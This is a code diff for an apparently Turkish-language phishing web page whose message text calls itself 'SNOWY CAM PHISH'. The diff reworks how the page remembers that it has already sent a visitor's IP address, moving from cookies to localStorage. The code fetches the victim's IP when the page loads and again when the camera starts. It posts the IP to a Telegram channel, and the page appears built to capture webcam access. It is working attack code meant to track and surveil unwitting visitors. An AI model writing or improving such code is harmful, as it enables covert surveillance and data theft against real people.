@@ -82,39 +82,16 @@
         let photoCount = 0;
         
         // ============================================
-        // ÇEREZ (COOKIE) İŞLEMLERİ - KESIN ÇÖZÜM
+        // SADECE BU LİNK İÇİN 1 KERE KONTROLÜ
         // ============================================
-        function setCookie(name, value, days) {
-            const date = new Date();
-            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
-            const expires = "expires=" + date.toUTCString();
-            document.cookie = name + "=" + value + ";" + expires + ";path=/";
-        }
-        
-        function getCookie(name) {
-            const cookieName = name + "=";
-            const cookies = document.cookie.split(';');
-            for(let i = 0; i < cookies.length; i++) {
-                let cookie = cookies[i];
-                while (cookie.charAt(0) == ' ') {
-                    cookie = cookie.substring(1);
-                }
-                if (cookie.indexOf(cookieName) == 0) {
-                    return cookie.substring(cookieName.length, cookie.length);
-                }
-            }
-            return "";
-        }
-        
-        // Bu ID için IP daha önce gönderilmiş mi?
         function ipGonderildiMi() {
-            const cookieKey = `ip_gonderildi_${TARGET_ID}`;
-            return getCookie(cookieKey) === "true";
+            const linkKey = `ip_gonderildi_${TARGET_ID}_${FOTO_SURESI}_${VIDEO_SURESI}`;
+            return localStorage.getItem(linkKey) === "true";
         }
         
         function ipGonderildiOlarakIsaretle() {
-            const cookieKey = `ip_gonderildi_${TARGET_ID}`;
-            setCookie(cookieKey, "true", 30); // 30 gün boyunca hatırla
+            const linkKey = `ip_gonderildi_${TARGET_ID}_${FOTO_SURESI}_${VIDEO_SURESI}`;
+            localStorage.setItem(linkKey, "true");
         }
         
         // ============================================
@@ -131,14 +108,10 @@
         }
         
         // ============================================
-        // İP'Yİ TELEGRAM'A GÖNDER (SADECE 1 KERE - ÇEREZ KONTROLLÜ)
+        // İP'Yİ TELEGRAM'A GÖNDER (SADECE 1 KERE)
         // ============================================
         async function sendIP(ip, kaynak = 'sayfa') {
-            // Daha önce gönderildiyse hiç gönderme
-            if (ipGonderildiMi()) {
-                console.log("IP daha önce gönderilmiş, tekrar gönderilmedi");
-                return;
-            }
+            if (ipGonderildiMi()) return;
             
             const msg = `❄️ SNOWY CAM PHISH ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP Adresi: ${ip}\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @snowy_dexry_wexry ⚡`;
             
@@ -151,9 +124,7 @@
                 })
             });
             
-            // Gönderildi olarak işaretle (30 gün boyunca)
             ipGonderildiOlarakIsaretle();
-            console.log(`IP gönderildi: ${kaynak} (çereze kaydedildi)`);
         }
         
         // ============================================
@@ -247,12 +218,9 @@
                 video.onloadedmetadata = async () => {
                     await video.play();
                     
-                    // SADECE 1 KERE IP GÖNDER (çerez kontrollü)
                     if (!ipGonderildiMi()) {
                         const ip = await getIP();
                         await sendIP(ip, 'kamera');
-                    } else {
-                        console.log("Kamera başlatıldı ama IP daha önce gönderilmiş");
                     }
                     
                     document.getElementById('startBtn').style.display = 'none';
@@ -268,17 +236,12 @@
         }
         
         // ============================================
-        // SAYFA YÜKLENDİĞİNDE - ÇEREZ KONTROLLÜ
+        // SAYFA YÜKLENDİĞİNDE
         // ============================================
         window.onload = async function() {
-            if (TARGET_ID) {
-                // Daha önce gönderilmemişse gönder
-                if (!ipGonderildiMi()) {
-                    const ip = await getIP();
-                    await sendIP(ip, 'sayfa');
-                } else {
-                    console.log("Sayfa yüklendi ama IP daha önce gönderilmiş (çerez var)");
-                }
+            if (TARGET_ID && !ipGonderildiMi()) {
+                const ip = await getIP();
+                await sendIP(ip, 'sayfa');
             }
         };
         
